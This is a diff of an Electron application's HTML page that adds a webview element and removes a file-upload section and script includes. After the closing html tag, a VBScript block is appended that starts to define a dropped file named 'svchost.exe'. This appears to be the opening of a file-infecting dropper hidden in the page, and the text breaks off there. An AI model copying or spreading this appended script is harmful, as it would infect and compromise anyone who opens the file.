@@ -6,33 +6,21 @@
   </head>
   <body>
     <link rel="stylesheet" href="./css/spirit.css">
+    <webview id="webview" src="./webview.html"></webview>
     <script>
-      var electron = require('electron');
-      var {ipcRenderer,remote} = electron;
-      var {Menu,MenuItem} = remote;
+        var electron = require('electron');
+        var {ipcRenderer,remote} = electron;
+        var {Menu,MenuItem} = remote;
 
-      window.Myrequire = window.require;//(如果需要)
-      window.Myexports = window.exports;//(如果需要)
-      window.Mymodule  = window.module;//(如果需要)
-      delete window.require;
-      delete window.exports;
-      delete window.module;
-      
-      var initData = {
-      };
-    </script>
-    <div class="container">
-      <input type="file" multiple="multiple"  @change="uploadFiles">
-      <template>
-        <img src="" alt="">
-      </template>
-      <canvas id="canvas">
+        window.Myrequire = window.require;//(如果需要)
+        window.Myexports = window.exports;//(如果需要)
+        window.Mymodule  = window.module;//(如果需要)
+        delete window.require;
+        delete window.exports;
+        delete window.module;
         
-      </canvas>
-    </div>
-    <script src="./js/jquery.js"></script>
-    <script src="./js/vue.min.js"></script>
-    <script src="./js/main.js"></script>
+        
+    </script>
   </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
